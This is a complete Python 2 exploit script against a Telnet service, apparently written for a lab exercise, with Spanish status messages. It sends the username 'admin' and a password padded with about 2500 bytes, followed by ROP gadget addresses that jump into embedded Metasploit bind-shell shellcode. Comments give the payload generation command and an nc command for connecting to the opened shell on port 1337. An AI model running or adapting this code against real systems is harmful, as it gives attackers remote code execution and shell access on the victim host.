import socket
from struct import pack as p
from time import sleep

host = '192.168.x.x'
port = 65534

# use payload/windows/shell_bind_tcp
# generate -b '\x00' -t py
# nc -vv 192.168.x.x 1337

buf  = "\xdb\xc3\xb8\x7e\xd6\x91\x73\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x53\x31\x42\x17\x03\x42\x17\x83\xbc\xd2\x73"
buf += "\x86\xbc\x33\xf1\x69\x3c\xc4\x96\xe0\xd9\xf5\x96\x97"
buf += "\xaa\xa6\x26\xd3\xfe\x4a\xcc\xb1\xea\xd9\xa0\x1d\x1d"
buf += "\x69\x0e\x78\x10\x6a\x23\xb8\x33\xe8\x3e\xed\x93\xd1"
buf += "\xf0\xe0\xd2\x16\xec\x09\x86\xcf\x7a\xbf\x36\x7b\x36"
buf += "\x7c\xbd\x37\xd6\x04\x22\x8f\xd9\x25\xf5\x9b\x83\xe5"
buf += "\xf4\x48\xb8\xaf\xee\x8d\x85\x66\x85\x66\x71\x79\x4f"
buf += "\xb7\x7a\xd6\xae\x77\x89\x26\xf7\xb0\x72\x5d\x01\xc3"
buf += "\x0f\x66\xd6\xb9\xcb\xe3\xcc\x1a\x9f\x54\x28\x9a\x4c"
buf += "\x02\xbb\x90\x39\x40\xe3\xb4\xbc\x85\x98\xc1\x35\x28"
buf += "\x4e\x40\x0d\x0f\x4a\x08\xd5\x2e\xcb\xf4\xb8\x4f\x0b"
buf += "\x57\x64\xea\x40\x7a\x71\x87\x0b\x13\xb6\xaa\xb3\xe3"
buf += "\xd0\xbd\xc0\xd1\x7f\x16\x4e\x5a\xf7\xb0\x89\x9d\x22"
buf += "\x04\x05\x60\xcd\x75\x0c\xa7\x99\x25\x26\x0e\xa2\xad"
buf += "\xb6\xaf\x77\x5b\xbe\x16\x28\x7e\x43\xe8\x98\x3e\xeb"
buf += "\x81\xf2\xb0\xd4\xb2\xfc\x1a\x7d\x5a\x01\xa5\x84\xa2"
buf += "\x8c\x43\xec\xc4\xd8\xdc\x98\x26\x3f\xd5\x3f\x58\x15"
buf += "\x4d\xd7\x11\x7f\x4a\xd8\xa1\x55\xfc\x4e\x2a\xba\x38"
buf += "\x6f\x2d\x97\x68\xf8\xba\x6d\xf9\x4b\x5a\x71\xd0\x3b"
buf += "\xff\xe0\xbf\xbb\x76\x19\x68\xec\xdf\xef\x61\x78\xf2"
buf += "\x56\xd8\x9e\x0f\x0e\x23\x1a\xd4\xf3\xaa\xa3\x99\x48"
buf += "\x89\xb3\x67\x50\x95\xe7\x37\x07\x43\x51\xfe\xf1\x25"
buf += "\x0b\xa8\xae\xef\xdb\x2d\x9d\x2f\x9d\x31\xc8\xd9\x41"
buf += "\x83\xa5\x9f\x7e\x2c\x22\x28\x07\x50\xd2\xd7\xd2\xd0"
buf += "\xe2\x9d\x7e\x70\x6b\x78\xeb\xc0\xf6\x7b\xc6\x07\x0f"
buf += "\xf8\xe2\xf7\xf4\xe0\x87\xf2\xb1\xa6\x74\x8f\xaa\x42"
buf += "\x7a\x3c\xca\x46"

username  = 'admin'
password  = 'exploitingCL' + 'a' * 2500
password += p('<I',0x71401461)		# mov ecx,esp/ret
password += p('<I',0x71401478)		# mov esi,ecx/ret
password += p('<I',0x71401464)		# add esi,14h/ret
password += p('<I',0x71401468)		# jmp esi

shellcode  = '\x90' * 10
shellcode += buf
shellcode += '\x90' * 10

try:
	print "\n Generando conexion a Telnet...\n"
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((host, port))

	print " [+] Enviando Username..."
	sleep(3)
	print '   [-] Username Size: {}'.format(len(username))
	client.send(username)

	print " [+] Enviando Password..."
	sleep(3)
	print '   [-] Password Size: {}'.format(len(password))
	client.send(password+shellcode)
	client.close()
except:
	print ' [:/] Conexion fallida'
